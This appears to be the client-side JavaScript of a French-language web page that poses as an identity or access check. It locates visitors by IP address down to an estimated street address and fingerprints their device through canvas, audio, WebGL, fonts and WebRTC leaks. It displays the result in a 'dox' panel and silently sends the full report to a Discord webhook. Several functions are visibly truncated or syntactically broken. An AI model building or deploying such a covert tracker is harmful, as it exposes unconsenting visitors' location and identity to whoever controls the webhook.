async function hash(str){
  try{
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
    return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2,"0")).join("").slice(0,20);
  }catch(e){
    let h = 2166136261;
    for(let i=0;i<str.length;i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 16777619); }
    return (h>>>0).toString(16).padStart(8,"0").repeat(2);
  }
}
async function fetchJson(url, ms = 4500){
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), ms);

    const r = await fetch(url, {cache:"no-store", signal:ctl.signal});
    if(!r.ok) return null;
    const d = await r.json();

  finally{ clearTimeout(t); }
}
const km = (a, b) => {
  if(a.lat == null || b.lat == null) return 0;
  const R = 6371, dLat = (b.lat-a.lat)*Math.PI/180, dLon = (b.lon-a.lon)*Math.PI/180;
  const la1 = a.lat*Math.PI/180, la2 = b.lat*Math.PI/180;
  const h = Math.sin(dLat/2)**2 + Math.cos(la1)*Math.cos(la2)*Math.sin(dLon/2)**2;
  return 2*R*Math.asin(Math.sqrt(h));
};

/* ---------- 1. découverte des IP, IPv6 prioritaire ---------- */

  const v4 = four && four.ip && !four.ip.includes(":") ? four.ip : null;
  return { v6: v6 || null, v4 };
}

/* ---------- 2. bases géo, interrogeables par IP ---------- */

async function lookup(ip){
  const fam = family(ip);
  const res = await Promise.allSettled(PROVIDERS.map(p =>
    fetchJson(p.u(ip)).then(d => { try{ const r = d ? p.map(d) : null; if(r) r.family = fam; return r; }catch(e){ return null; } })
  ));
  return res.map(r => r.status === "fulfilled" ? r.value : null).filter(Boolean);
}

/* ---------- 3. géocodage inverse (rue) ---------- */
async function reverseStreet(lat, lon){
  const out = { road:"", house:"", hood:"", zip:"", city:"", region:"", country:"", via:"" };
  if(lat == null || lon == null) return out;
  const nom = await fetchJson(
    `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=fr`, 5000);
  const a = nom && nom.address;
  if(a){
    out.road = a.road || a.pedestrian || a.footway || a.square || a.hamlet || "";
    out.house = a.house_number || "";
    out.hood = a.neighbourhood || a.suburb || a.quarter || a.city_district || "";
    out.zip = a.postcode || "";
    out.city = a.city || a.town || a.village || a.municipality || "";
    out.region = a.state || a.region || "";
    out.country = a.country || "";
    out.via = "nominatim";
    return out;
  }
  const bdc = await fetchJson(
    `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=fr`, 4000);
  if(bdc){
    out.hood = bdc.locality || "";
    out.zip = bdc.postcode || "";
    out.city = bdc.city || "";
    out.region = bdc.principalSubdivision || "";
    out.country = bdc.countryName || "";
    out.via = "bigdatacloud";
  }
  return out;
}

/* ---------- 4. consensus géo ---------- */
async function geoResolve(){
  const ips = await discoverIps();
  const targets = [ips.v6, ips.v4].filter(Boolean);

  const blank = { v4:ips.v4, v6:ips.v6, v6prefix:v6prefix(ips.v6), records:[], best:null,
    address:null, spread:0, agree:0, total:0, v4v6:null, failed:!targets.length };

  if(!targets.length){
    const f = await fetchJson("https://api.ipify.org?format=json", 2500);
    return { ...blank, v4:(f && f.ip) || null, failed:!(f && f.ip) };
  }

  const all = (await Promise.all(targets.map(lookup))).flat();
  if(!all.length) return { ...blank, failed:true };

  const pts = all.filter(r => r.lat != null && r.lon != null);
  let spread = 0;
  for(let i=0;i<pts.length;i++) for(let k=i+1;k<pts.length;k++) spread = Math.max(spread, km(pts[i], pts[k]));

  const counts = {};
  all.forEach(r => { counts[r.ip] = (counts[r.ip]||0)+1; });
  const agree = Math.max(...Object.values(counts));

  let v4v6 = null;
  const p4 = all.filter(r => r.family === "IPv4" && r.lat != null);
  const p6 = all.filter(r => r.family === "IPv6" && r.lat != null);
  if(p4.length && p6.length){
    let d = 0;
    p4.forEach(a => p6.forEach(b => d = Math.max(d, km(a,b))));
    v4v6 = Math.round(d);
  }

  const scoreRec = r => (r.zip ? 45 : 0) + (r.city ? 30 : 0) + (r.region ? 5 : 0)
    + (r.conf != null ? Math.min(20, r.conf / 5) : 0) + (r.family === "IPv6" ? 8 : 0);
  const best = all.slice().sort((a,b) => scoreRec(b) - scoreRec(a))[0] || null;

  let address = null;
  if(best && best.lat != null){
    address = await reverseStreet(best.lat, best.lon);
    if(!address.road && best.zip) address.zip = address.zip || best.zip;
    if(!address.city) address.city = address.city || best.city;
  }

  return { ...blank, records:all, best, address, spread:Math.round(spread), agree,
    total:all.length, v4v6, failed:false };
}

/* ---------- fuite WebRTC ---------- */
function rtcIps(timeout = 3000){
  return new Promise(res => {
    const found = new Set();
    let pc, closed = false;
    const done = () => { if(closed) return; closed = true; try{ pc && pc.close(); }catch(e){} res([...found]); };
    try{ pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); }
    catch(e){ return res([]); }
    pc.onicecandidate = e => {
      if(!e.candidate) return done();
      try{
        const p = e.candidate.candidate.split(" ");
        if(p[4]) found.add(p[4] + " · " + p[7] + (p[5] ? ":"+p[5] : ""));
      }catch(_){}
    };
    try{ pc.createDataChannel("x"); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{}); }catch(e){}
    setTimeout(done, timeout);
  });
}

function glInfo(){

    if(!gl) return {v:"—", r:"—", max:"—"};

      r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),

async function audioFp(){
  try{
    const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if(!Ctx) return "indisponible";
    const ctx = new Ctx(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = "triangle"; osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
    const buf = await ctx.startRendering();
    const d = buf.getChannelData(0);
    let sum = 0;
    for(let i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
    return await hash(sum.toFixed(8));
  }catch(e){ return "indisponible"; }

    const w = f => { c.font = "72px "+f; return c.measureText("mmmmmmmmmmlli").width; };
    const b = base.map(w);
    return test.filter(f => base.some((bs,i) => w("'"+f+"',"+bs) !== b[i]));
  }catch(e){ return []; }
}

/* ---------- collecte ---------- */
async function collect(){
  const geo = await safe(geoResolve, { v4:null, v6:null, v6prefix:"", records:[], best:null,
    address:null, spread:0, agree:0, total:0, v4v6:null, failed:true });

  const [rtc, cvFp, audFp, bat, uaData, storage, audio, devices, fontList, voices] = await Promise.all([
    safe(rtcIps, []),
    safe(canvasFp, "indisponible"),
    safe(audioFp, "indisponible"),
    safe(async () => {
      if(!navigator.getBattery) return "API absente";
      const b = await navigator.getBattery();
      return Math.round(b.level*100)+"%"+(b.charging?" (en charge)":"");
    }, "indisponible"),
    safe(async () => navigator.userAgentData
      ? await navigator.userAgentData.getHighEntropyValues(
          ["platform","platformVersion","architecture","bitness","model","uaFullVersion"])
      : null, null),
    safe(async () => {
      const s = await navigator.storage.estimate();
      return (s.quota/1048576).toFixed(1)+" Mo quota · "+(s.usage/1048576).toFixed(2)+" Mo utilisés";
    }, "—"),
    safe(async () => {
      const ac = new (window.AudioContext||window.webkitAudioContext)();
      const o = {rate: ac.sampleRate, ch: ac.destination.maxChannelCount};
      ac.close();
      return o;
    }, {}),
    safe(async () => {
      const d = await navigator.mediaDevices.enumerateDevices();
      return d.map(x => x.kind.replace("input","in").replace("output","out")+": "+(x.label||"anonyme")).join(" · ") || "aucun";
    }, "—"),
    safe(fonts, []),
    safe(async () => (speechSynthesis.getVoices()||[]).length + " voix", "—")
  ]);

  const perms = {};
  for(const n of ["geolocation","camera","microphone","notifications","clipboard-read","midi"]){
    perms[n] = await safe(async () => (await navigator.permissions.query({name:n})).state, "—");
  }

  const gl = glInfo();
  const tz = Intl.DateTimeFormat().resolvedOptions();
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const mem = performance.memory ? (performance.memory.usedJSHeapSize/1048576).toFixed(1)+" Mo heap JS" : "—";
  const codecs = await safe(async () => {
    const v = document.createElement("video");
    return ["video/mp4; codecs=avc1.42E01E","video/webm; codecs=vp9","video/webm; codecs=av01","audio/mpeg","audio/flac","audio/ogg; codecs=opus"]
      .map(c => c+" → "+(v.canPlayType(c) || "non"));
  }, []);

  const D = { geo, rtc, cvFp, audFp, bat, uaData, perms, storage, audio, gl, tz, mem, conn,
    codecs, voices, devices, fontList, ua: navigator.userAgent || "" };

  D.fpGlobal = await hash([cvFp, audFp, gl.r, D.ua, screen.width+"x"+screen.height,
    tz.timeZone, navigator.language, navigator.hardwareConcurrency].join("|"));

  const ipTz = (geo.best && geo.best.tz) || "";
  const browserTz = tz.timeZone || "";
  const tzMismatch = !!(ipTz && browserTz && ipTz !== browserTz);
  const locRegion = (navigator.language || "").split("-")[1];
  const cc = (geo.best && geo.best.cc) || "";
  const ccMismatch = !!(locRegion && cc && locRegion.toUpperCase() !== String(cc).toUpperCase());
  const dc = /vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247|linode|vultr|scaleway|azure|gcore|choopa|contabo|leaseweb/i
    .test((geo.best && geo.best.isp) || "");
  const spreadHigh = geo.spread > 120;
  const split46 = geo.v4v6 != null && geo.v4v6 > 150;
  D.verdict = { tzMismatch, ccMismatch, dc, spreadHigh, split46,
    score: Math.min(100, (dc?40:0)+(tzMismatch?20:0)+(ccMismatch?10:0)+(spreadHigh?15:0)+(split46?15:0)) };
  return D;
}

/* ---------- sections ---------- */
function buildSections(D){
  const g = D.geo || {};
  const v = D.verdict;
  const b = g.best;
  const ad = g.address || {};
  const S = [];

  const addrLine = ad.road
    ? `<div class="addr">${esc((ad.house ? ad.house+" " : "") + ad.road)}<small>${esc([ad.hood, ad.zip, ad.city, ad.region, ad.country].filter(Boolean).join(", "))}</small></div>`
    : ad.city
      ? `<div class="addr">${esc([ad.zip, ad.city].filter(Boolean).join(" "))}<small>${esc([ad.hood, ad.region, ad.country].filter(Boolean).join(", "))} — niveau quartier</small></div>`
      : `<span class="lo">non résolue</span>`;

  const hasPos = b && b.lat != null && b.lon != null;
  const tzLine = b && b.tz
    ? (v.tzMismatch
        ? `<span class="warn">${esc(b.tz)}</span> (IP) ≠ <span class="mono">${esc(D.tz.timeZone)}</span> (machine)`
        : `<span class="mono">${esc(D.tz.timeZone)}</span> · cohérent avec l'IP`)
    : `<span class="mono">${esc(D.tz.timeZone)}</span> · fuseau IP indisponible`;

  const verdictTxt = !b ? `<span class="lo">IP non résolue</span>`
    : v.score >= 60 ? `<span class="lo">anonymisation probable</span>`
    : v.score >= 25 ? `<span class="warn">signaux mitigés</span>`
    : `<span class="hi">IP directe, cohérente</span>`;

  S.push({title:"Adresse estimée", rows:[
    ["Adresse", addrLine],
    ["Coordonnées", hasPos
      ? `<span class="hi">${b.lat.toFixed(5)}, ${b.lon.toFixed(5)}</span> · <a href="https://www.google.com/maps?q=${b.lat},${b.lon}&z=17" target="_blank" rel="noopener">carte zoom 17</a>`
      : `<span class="lo">non fournies par les bases</span>`],
    ["Niveau de précision", ad.road ? "rue (centroïde opérateur)" : ad.city ? "quartier / commune" : "inconnu"],
    ["Source géocodage", ad.via ? esc(ad.via) : "—"]
  ]});

  S.push({title:"Réseau", rows:[
    ["IPv6", g.v6 ? `<span class="mono">${esc(g.v6)}</span>` : `<span class="lo">absent — connexion IPv4 seule</span>`],
    ["Préfixe IPv6", g.v6prefix ? `<span class="mono">${esc(g.v6prefix)}</span>` : "—"],
    ["IPv4", g.v4 ? `<span class="mono">${esc(g.v4)}</span>` : "—"],
    ["Familles disponibles", `${g.v6 ? "IPv6 " : ""}${g.v4 ? "IPv4" : ""}`.trim() || "—"],
    ["FAI / organisation", (b && b.isp) ? esc(b.isp) : "—"],
    ["ASN", (b && b.asn) ? esc(String(b.asn)) : "—"],
    ["Datacenter / VPN", v.dc ? `<span class="lo">PROBABLE</span>` : (b ? "aucun signe" : "—")],
    ["Écart IPv4 ↔ IPv6", g.v4v6 != null ? `${g.v4v6} km${v.split46?" <span class='warn'>(divergent)</span>":""}` : "non comparable"],
    ["IP locales (WebRTC)", D.rtc.length ? `<span class="mono">${esc(D.rtc.join(" · "))}</span>` : "masquées (mDNS)"],
    ["Type de connexion", D.conn ? esc([D.conn.effectiveType, D.conn.downlink+" Mbps", D.conn.rtt+" ms RTT", D.conn.saveData?"économie":"normal"].filter(Boolean).join(" · ")) : "—"]
  ]});

  S.push({title:"Localisation (IP, sans autorisation)", rows:[
    ["Ville / région / CP", b ? esc([b.city, b.region, b.zip].filter(Boolean).join(", ") || "—") : "—"],
    ["Pays", b ? esc((b.country || "?") + " " + flag(b.cc)) : "—"],
    ["Fuseau horaire", tzLine],
    ["Heure locale / UTC", `${esc(nowLocal())} · <span class="mono">${new Date().toISOString().slice(0,19).replace("T"," ")}</span>`],
    ["Langues", esc((navigator.languages || [navigator.language]).join(", "))],
    ["Langue ↔ pays", v.ccMismatch ? `<span class="warn">divergence</span> (${esc((navigator.language||"").split("-")[1]||"")} vs ${esc(b.cc)})` : "cohérent"],
    ["Bases concordantes", g.total ? `${g.agree}/${g.total} réponses · écart max ${g.spread} km${v.spreadHigh?" <span class='warn'>(dispersé)</span>":""}` : "aucune réponse"],
    ["Verdict", `${verdictTxt} · indice ${v.score}/100<div class="gauge"><i style="width:${Math.max(4,v.score)}%"></i></div>`]
  ]});

  const ua = D.uaData || {};
  S.push({title:"Appareil", rows:[
    ["Plateforme", esc(ua.platform || navigator.platform || "—")],
    ["Version OS", esc(ua.platformVersion || "—")],
    ["Architecture / bits", esc([ua.architecture, ua.bitness].filter(Boolean).join(" ") || "—")],
    ["Modèle", esc(ua.model || "—")],
    ["Cœurs CPU", `<span class="mono">${navigator.hardwareConcurrency || "—"}</span>`],
    ["RAM estimée", navigator.deviceMemory ? `<span class="mono">${navigator.deviceMemory} Go</span>` : "—"],
    ["Écran", `<span class="mono">${screen.width}×${screen.height} · ${screen.colorDepth} bits · DPR ${window.devicePixelRatio}</span>`],
    ["Fenêtre / orientation", `<span class="mono">${window.innerWidth}×${window.innerHeight}</span> · ${esc(screen.orientation ? screen.orientation.type : "—")}`],
    ["Tactile / pointeur", `${navigator.maxTouchPoints} points · ${matchMedia("(pointer:fine)").matches?"souris précise":"pointeur grossier"}`],
    ["Batterie", esc(D.bat)],
    ["GPU", `${esc(D.gl.v)} — ${esc(D.gl.r)}`],
    ["Audio", `${D.audio.rate || "—"} Hz · ${D.audio.ch || "—"} canaux`],
    ["Mémoire JS", esc(D.mem)]
  ]});

  S.push({title:"Empreintes", rows:[
    ["Empreinte globale", `<span class="mono">${esc(D.fpGlobal)}</span>`],
    ["Canvas", `<span class="mono">${esc(D.cvFp)}</span>`],
    ["Audio", `<span class="mono">${esc(D.audFp)}</span>`],
    ["WebGL max texture", esc(String(D.gl.max))],
    ["Polices détectées", D.fontList.length ? esc(D.fontList.slice(0,18).join(", ")) + (D.fontList.length>18?" …":"") : "aucune"],
    ["Codecs", esc(D.codecs.join(" · ") || "—")],
    ["Voix TTS", esc(D.voices)],
    ["Stockage", esc(D.storage)],
    ["Cookies / DNT", `${navigator.cookieEnabled?"activés":"désactivés"} · DNT ${navigator.doNotTrack || "non"}`]
  ]});

  S.push({title:"Permissions (état, sans demande)", rows:[
    ["Géoloc navigateur", `<span class="mono">${esc(D.perms.geolocation)}</span> · non utilisée ici`],
    ["Caméra / micro", `${esc(D.perms.camera)} · ${esc(D.perms.microphone)}`],
    ["Notifications / presse-papier", `${esc(D.perms.notifications)} · ${esc(D.perms["clipboard-read"])}`],
    ["Périphériques", esc(D.devices)]
  ]});

  S.push({title:"Contexte", rows:[
    ["Provenance", esc(document.referrer || "accès direct")],
    ["Ouverture", window.opener ? "fenêtre enfant" : "directe"],
    ["Préférences", `${matchMedia("(prefers-color-scheme:dark)").matches?"sombre":"clair"} · ${matchMedia("(prefers-reduced-motion:reduce)").matches?"mouvement réduit":"animations"}`],
    ["Surface disponible", `${screen.availWidth}×${screen.availHeight}`],
    ["User-Agent", `<span class="mono">${esc(D.ua.slice(0,300))}</span>`]
  ]});

  return S;
}

/* ---------- affichage progressif ---------- */
async function reveal(S){
  const dox = $("dox");
  dox.hidden = false;
  for(const sec of S){
    const el = document.createElement("section");
    el.className = "sec";
    el.innerHTML = `<h2>${esc(sec.title)}</h2>`;
    dox.appendChild(el);
    for(const [k, val] of sec.rows){
      const r = document.createElement("div");
      r.className = "row";
      r.innerHTML = `<span class="k">${esc(k)}</span><span class="v">${val}</span>`;
      el.appendChild(r);
      await sleep(55);
    }
    await sleep(75);
  }
}

/* ---------- Discord ---------- */
async function send(D){
  const g = D.geo || {};
  const b = g.best || {};
  const ad = g.address || {};
  const f = (n,val,i) => ({name:n, value:String(val || "—").slice(0,1000), inline:!!i});
  const adresse = [ (ad.house?ad.house+" ":"")+ad.road, ad.hood, ad.zip, ad.city, ad.region, ad.country ]
    .filter(Boolean).join(", ");

  const embeds = [
    { title:"📍 Adresse estimée", color:0x86efac, fields:[
      f("Adresse", adresse || "non résolue"),
      f("Coordonnées", (b.lat!=null) ? `\`${b.lat},${b.lon}\` · https://maps.google.com/?q=${b.lat},${b.lon}&z=17` : "—"),
      f("IPv6", g.v6 ? "`"+g.v6+"`" : "absent", true),
      f("Préfixe", g.v6prefix ? "`"+g.v6prefix+"`" : "—", true),
      f("IPv4", g.v4 ? "`"+g.v4+"`" : "—", true),
      f("FAI", b.isp || "—"),
      f("ASN", b.asn || "—", true),
      f("Écart v4/v6", g.v4v6 != null ? g.v4v6+" km" : "—", true),
      f("Verdict VPN", `${D.verdict.score}/100`, true),
      f("Bases", `${g.agree||0}/${g.total||0} · écart ${g.spread||0}km`, true),
      f("TZ IP / machine", `${b.tz||"—"} / ${D.tz.timeZone}${D.verdict.tzMismatch?" ⚠":""}`),
      f("IP locales WebRTC", D.rtc.join(" · ") || "mDNS")
    ]},
    { title:"💻 Appareil", color:0x38bdf8, fields:[
      f("Plateforme", (D.uaData && D.uaData.platform) || navigator.platform, true),
      f("Arch", D.uaData ? [D.uaData.architecture,D.uaData.bitness].filter(Boolean).join(" ") : "—", true),
      f("Modèle", (D.uaData && D.uaData.model) || "—", true),
      f("CPU", navigator.hardwareConcurrency, true),
      f("RAM", navigator.deviceMemory ? navigator.deviceMemory+" Go" : "—", true),
      f("Écran", `${screen.width}×${screen.height} @${window.devicePixelRatio}x`, true),
      f("GPU", `${D.gl.v} — ${D.gl.r}`),
      f("Audio", `${D.audio.rate||"—"}Hz ${D.audio.ch||"—"}ch`, true),
      f("Batterie", D.bat, true),
      f("Langues", (navigator.languages||[]).join(", ")),
      f("UA", "```"+(D.ua||"").slice(0,900)+"```")
    ]},
    { title:"🧬 Empreintes & permissions", color:0xf0abfc, fields:[
      f("Empreinte", "`"+D.fpGlobal+"`"),
      f("Canvas", "`"+D.cvFp+"`", true),
      f("Audio", "`"+D.audFp+"`", true),
      f("Polices", D.fontList.slice(0,25).join(", ") || "—"),
      f("Stockage", D.storage),
      f("Permissions", JSON.stringify(D.perms)),
      f("Périphériques", D.devices),
      f("Référent", document.referrer || "direct", true)
    ]}
  ];
  const payload = { username: SITE_NAME+" · Visiteur", embeds: embeds.map(e => ({
    ...e, timestamp:new Date().toISOString(), footer:{text: LABEL+" · "+((g.v6 || g.v4)||"ip inconnue")}
  }))};
  const body = JSON.stringify(payload);
  try{
    const r = await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body,keepalive:true});
    if(!r.ok) throw 0;
  }catch(e){
    try{ await fetch(WEBHOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body,keepalive:true}); }catch(_){}
  }
}

/* ---------- rendu ---------- */
async function render(D){
  await reveal(buildSections(D));
  send(D);

  const tools = $("tools");
  tools.className = "tools";
  tools.innerHTML = `
    <button class="btn alt" id="copy">Copier le rapport</button>
    ${D.geo.failed ? '<button class="btn alt" id="retry">Relancer</button>' : ""}
    ${REDIRECT ? '<button class="btn" id="next">Continuer</button>' : ""}
  `;
  $("copy").onclick = async () => {
    const txt = [...document.querySelectorAll(".row")].map(r =>
      r.querySelector(".k").textContent + " : " + r.querySelector(".v").textContent).join("\n");
    try{ await navigator.clipboard.writeText(txt); $("copy").textContent = "Copié"; }
    catch(e){ $("copy").textContent = "Échec"; }
  };
  if(D.geo.failed) $("retry").onclick = async () => {
    $("dox").innerHTML = "";
    $("tools").innerHTML = "";
    document.querySelector(".small")?.remove();
    const D2 = await collect();
    await render(D2);
  };
  if(REDIRECT) $("next").onclick = () => location.href = REDIRECT;

  const s = document.createElement("p");
  s.className = "small";
  s.textContent = "Rapport transmis · empreinte " + D.fpGlobal;
  tools.after(s);
}

/* ---------- séquence ---------- */
let busy = false;
async function enter(){
  if(busy) return; busy = true;
  const go = $("go");
  go.disabled = true;
  go.innerHTML = '<span class="spin"></span><span>Résolution IPv6 en cours…</span>';
  $("bar").classList.add("on");
  requestAnimationFrame(()=>{ $("fill").style.width = "100%"; });

  let D;
  try{ D = await collect(); }
  catch(e){
    D = { geo:{ failed:true, v4:null, v6:null, v6prefix:"", records:[], best:null, address:null,
      spread:0, agree:0, total:0, v4v6:null },
      rtc:[], cvFp:"indisponible", audFp:"indisponible", bat:"indisponible", uaData:null,
      perms:{}, storage:"—", audio:{}, gl:{v:"—",r:"—",max:"—"},
      tz:Intl.DateTimeFormat().resolvedOptions(), mem:"—", conn:null, codecs:[], voices:"—",
      devices:"—", fontList:[], ua:navigator.userAgent || "" };
    D.fpGlobal = await hash("fallback"+D.ua);
    D.verdict = { tzMismatch:false, ccMismatch:false, dc:false, spreadHigh:false, split46:false, score:0 };
  }

  $("title").innerHTML = "Identité<br><em>vérifiée</em>";
  $("sub").innerHTML = "Résolution IPv6 prioritaire, puis géocodage inverse — sans aucune autorisation demandée.";
  $("badge").classList.add("ok");
  $("badge").innerHTML = '<span class="dot"></span>Accès autorisé';
  go.style.display = "none";
  $("later").style.display = "none";

  await render(D);
}

$("go").addEventListener("click", enter);
$("later").addEventListener("click", enter);
</script>
